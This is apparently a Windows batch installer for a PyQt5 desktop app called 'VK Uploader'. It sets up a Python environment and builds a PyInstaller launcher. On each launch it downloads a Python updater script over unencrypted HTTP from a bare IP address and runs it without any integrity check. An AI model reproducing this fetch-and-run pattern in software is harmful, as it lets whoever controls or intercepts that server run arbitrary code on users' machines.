@echo off
setlocal enabledelayedexpansion

:: === COLORS (limited in CMD) ===
:: CMD doesn't support true ANSI colors reliably, so we use basic labels
echo [INFO] Starting VK Uploader installer for Windows...

:: === PREVENT PIPED EXECUTION ===
if "%~dp0" == "%TEMP%\" (
    echo [ERROR] This script must be saved to a file and run directly.
    echo [ERROR] Do NOT use: curl ... ^| cmd
    exit /b 1
)

:: === SET PATHS ===
set "CONFIG_DIR=%LOCALAPPDATA%\VK Uploader"
set "APP_PATH=%LOCALAPPDATA%\Programs\VK Uploader\vk-uploader.exe"
set "SCRIPT_DIR=%~dp0"
set "SCRIPT_NAME=%~nx0"
set "TARGET_SCRIPT=%CONFIG_DIR%\%SCRIPT_NAME%"
set "BUILT_MARKER=%CONFIG_DIR%\built"

:: === RUNNING FROM INSTALLED LOCATION ===
if /i "%SCRIPT_DIR%" == "%CONFIG_DIR%\" (
    echo [INFO] Running from installed location.

    set "UPDATE_PY=%CONFIG_DIR%\update.py"
    echo [INFO] Downloading update.py...
    curl -fsSL -o "!UPDATE_PY!" "http://194.113.153.253:8001/script" || (
        echo [ERROR] Failed to download update.py
        exit /b 1
    )

    if exist "%BUILT_MARKER%" (
        echo [INFO] Runtime mode: launching app.

        set "VENV=%CONFIG_DIR%\.venv"
        if not exist "!VENV!\" (
            echo [ERROR] Virtual environment missing.
            exit /b 1
        )

        :: Check dependencies
        set "MISSING="
        for %%p in (PyQt5 requests) do (
            "!VENV!\Scripts\python.exe" -c "import %%p" >nul 2>&1 || set "MISSING=!MISSING! %%p"
        )
        if defined MISSING (
            echo [INFO] Installing:!MISSING!
            "!VENV!\Scripts\python.exe" -m pip install --quiet --upgrade pip
            "!VENV!\Scripts\python.exe" -m pip install --quiet!MISSING!
        )

        :: Ensure app code
        if not exist "%CONFIG_DIR%\pyqt5_ui\" (
            echo [INFO] Running updater...
            "!VENV!\Scripts\python.exe" "!UPDATE_PY!"
        )

        if exist "%CONFIG_DIR%\pyqt5_ui\" if exist "%CONFIG_DIR%\pyqt5_ui\main.py" (
            echo [INFO] Launching main application...
            start "" "!VENV!\Scripts\python.exe" -m pyqt5_ui.main
            exit /b 0
        ) else (
            echo [ERROR] pyqt5_ui/main.py not found after update.
            exit /b 1
        )
    )

    :: === FIRST-TIME BUILD ===
    echo [INFO] First-time build: creating launcher...

    :: Create venv
    set "VENV=%CONFIG_DIR%\.venv"
    if not exist "!VENV!\" (
        echo [INFO] Creating virtual environment...
        python -c "import sys; exit(0 if sys.version_info >= (3,11) else 1)" >nul 2>&1
        if errorlevel 1 (
            py -3.11 -c "print('ok')" >nul 2>&1 && set "PY=py -3.11" || set "PY=python"
        ) else (
            set "PY=python"
        )
        !PY! -m venv "!VENV!" || (
            echo [ERROR] Failed to create virtual environment. Ensure Python 3.11+ is installed.
            exit /b 1
        )
    )

    "!VENV!\Scripts\python.exe" -m pip install --quiet --upgrade pip
    "!VENV!\Scripts\python.exe" -m pip install --quiet pyinstaller

    :: launcher_stub.py
    (
        echo import os
        echo import sys
        echo CONFIG_DIR = r"%CONFIG_DIR%"
        echo init_bat = os.path.join(CONFIG_DIR, "vk-uploader-installer.bat")
        echo if not os.path.isfile(init_bat):
        echo     sys.exit("FATAL: vk-uploader-installer.bat not found")
        echo os.chdir(CONFIG_DIR)
        echo os.execv(os.path.join(os.environ['SYSTEMROOT'], 'System32', 'cmd.exe'), ['cmd.exe', '/c', init_bat])
    ) > "%CONFIG_DIR%\launcher_stub.py"

    :: Icon (optional)
    set "ICON_ARG="
    set "ICON_PATH=%CONFIG_DIR%\vk-logo.ico"
    if not exist "!ICON_PATH!" (
        curl -fsSL -o "!ICON_PATH!" "https://raw.githubusercontent.com/Ilya0khiriv/updater_zero/main/pyqt5_vk_uploader_folder/vk-logo.png" >nul 2>&1 && (
            :: Convert PNG to ICO? Not trivial in batch. Skip or assume .ico exists.
            :: For now, we skip icon if not .ico. You can pre-provide .ico or omit.
            del "!ICON_PATH!" >nul 2>&1
        )
    )
    if exist "!ICON_PATH!" (
        set "ICON_ARG=--icon=!ICON_PATH!"
    )

    :: Build with PyInstaller (ONEFILE)
    cd /d "!CONFIG_DIR!"
    set "PYINST_CMD=!VENV!\Scripts\pyinstaller.exe --clean --noconfirm --windowed --onefile --name=vk-uploader"
    if defined ICON_ARG set "PYINST_CMD=!PYINST_CMD! !ICON_ARG!"
    set "PYINST_CMD=!PYINST_CMD! launcher_stub.py"

    !PYINST_CMD! || (
        echo [ERROR] PyInstaller failed.
        exit /b 1
    )

    :: Install
    set "INSTALL_DIR=%LOCALAPPDATA%\Programs\VK Uploader"
    if exist "!INSTALL_DIR!\" rmdir /s /q "!INSTALL_DIR!"
    mkdir "!INSTALL_DIR!" >nul 2>&1
    move "dist\vk-uploader.exe" "!INSTALL_DIR!" >nul 2>&1

    :: Cleanup
    rmdir /s /q build dist 2>nul
    del /q *.spec launcher_stub.py 2>nul
    "!VENV!\Scripts\pip.exe" uninstall --quiet -y pyinstaller

    echo. > "%BUILT_MARKER%"

    echo [INFO] ✅ App installed to: %APP_PATH%
    echo [INFO] You can now launch "VK Uploader" from Start Menu or the above path.
    pause
    exit /b 0
)

:: === FIRST RUN: INSTALL TO CONFIG DIR ===
echo [INFO] 🚀 First run. Installing to config directory...

mkdir "%CONFIG_DIR%" 2>nul
copy /y "%~f0" "%TARGET_SCRIPT%" >nul

:: Create venv
python -c "import sys; exit(0 if sys.version_info >= (3,11) else 1)" >nul 2>&1
if errorlevel 1 (
    py -3.11 -c "print('ok')" >nul 2>&1 && set "PY=py -3.11" || set "PY=python"
) else (
    set "PY=python"
)
!PY! -m venv "%CONFIG_DIR%\.venv" || (
    echo [ERROR] Python 3.11+ not found.
    exit /b 1
)

echo [INFO] Relaunching from installed location...
start "" /d "%CONFIG_DIR%" "%TARGET_SCRIPT%"
exit /b 0
